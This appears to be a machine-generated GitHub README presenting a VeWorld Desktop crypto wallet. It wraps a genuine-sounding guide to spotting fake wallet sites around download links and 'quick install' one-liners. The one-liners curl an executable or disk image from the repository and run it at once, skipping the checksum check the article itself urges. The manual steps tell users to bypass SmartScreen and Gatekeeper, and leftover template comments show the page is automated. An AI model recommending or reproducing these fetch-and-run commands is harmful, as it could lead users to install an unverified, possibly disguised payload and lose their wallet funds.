![VeWorld Desktop](../assets/banner-article.png)

# Fake Crypto Wallet App vs VeWorld Desktop: How to Tell Them Apart

The phrase request is the tell, not the design

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

A fake wallet site copies a real wallet's look and asks for the one thing a real one never needs: your recovery phrase. The reliable test is not visual, it is procedural. VeWorld Desktop is distributed through the project's GitHub releases page, and any other source, however convincing, is not the published build.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

A search result, an advert, a direct message or a "support agent" points you at a download page you did not go looking for. The page looks right, the logo is right, and the only thing that feels off is that it wants a phrase, a password, or a small payment before it will let you in.

| What happens | What it usually is | What to do |
|---|---|---|
| A site asks for your <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">VeWorld Desktop recovery phrase</a> to "validate" or "sync" | Theft, in one step | Close it; no legitimate wallet asks |
| Support contacts you first, in a chat or DM | Impersonation | Ignore; real support does not open conversations |
| A download requires a "verification" payment | Advance-fee scam | Leave; published builds are free |
| An advert ranks above the real project | Paid placement | Use the release page instead of the ad |
| A site mirrors the design but the address bar differs | Lookalike domain | Check the domain character by character |

## Why it happens

Wallet phishing works because the legitimate flow is already a download followed by a phrase entry, and a fake page only has to move one step earlier. A real wallet asks for the phrase when *you* restore a wallet, inside the app, on your own machine. A fake page asks for it in a browser form, where it travels to whoever built the page.

The support impersonation variant is more patient. Someone monitors a public complaint, replies offering help, and links to a page that "fixes" the problem by collecting the phrase. Because the approach follows a real problem, the request feels like the answer rather than the attack, and the timing is what makes it work.

App-store and advert placements exploit the same trust. A listing or a sponsored result can appear above the genuine one, and a page that carries a wallet's name in its title is not thereby the project's page. The name in the browser tab is text; the domain is not.

None of this is specific to one project, and none of it can be fixed by a wallet. What a wallet can do is make its own distribution unambiguous. The published builds live on the project's GitHub releases page with the checksums for each file, so a download has a single authoritative source to compare against - and a page that is not that source has no claim on your phrase, whatever it displays.

## Fix

1. Get the wallet from the project's GitHub releases page, and treat every other download source as unverified until proven otherwise.
2. Compare the checksum published with the release against the file you downloaded, using your operating system's own hashing tool.
3. If a page asks for your recovery phrase at any point outside the app's own restore screen, close it. The phrase is never needed by a website.
4. If someone contacts you offering wallet support, end the conversation and work from the release page and the app itself.
5. If you already entered a phrase on a page you do not trust, create a fresh wallet and move the balance immediately; a phrase cannot be revoked, and <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md">the VeWorld Desktop restore flow</a> is the only place it is legitimately typed.

## If that did not work

If a balance has already moved without your approval, the wallet cannot reverse it. Create a new wallet, move whatever remains, and stop using the exposed address.

If you are unsure whether a page was genuine, compare the file's checksum with the release page. A matching checksum means the binary is the published one; a missing or different checksum means it is not, regardless of how the page looked.

If a support conversation is ongoing, break it off before sending anything else. Impersonators escalate from a link to a request for remote access, and remote access to the machine is equivalent to handing over the wallet.

## Prevention

- Bookmark the release page instead of searching for a download each time.
- Verify the checksum on every download, not only the first.
- Treat unsolicited support as hostile by default, on every channel.
- Never type the recovery phrase into a browser, a chat, or a form; only into the app's own restore screen, on your own machine.
- Keep the phrase written on paper, not in a photo or a synced note.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### How do I know a download is the real one?

It comes from the project's GitHub releases page and its checksum matches the value published beside it. Those two facts together are the whole test.

### Would a real wallet ever ask for my recovery phrase?

Only inside its own restore flow, on your device, and only because you started it. A website form, a chat message or a support agent asking for it is not that flow.

### Someone offered to fix my wallet in a DM. Is that legitimate?

No. Support does not initiate contact, and any offer that arrives unrequested and ends at a link or a phrase request is an attempt to take the balance.

### What should I do if I already entered my phrase somewhere?

Create a new wallet on a machine you trust and move the funds out of the exposed address. The old phrase stays valid forever, so the address cannot be made safe again.

### Can a fake site drain funds without my phrase?

It needs a signature or the phrase. That is why refusing both, and reading every request before approving it, closes the common routes.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [How self-custody works in this wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [What VeWorld Desktop is, and which VeWorld it is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)
- [What happens when a Ledger is compromised](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [Moving off the VeChainThor wallet safely](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md)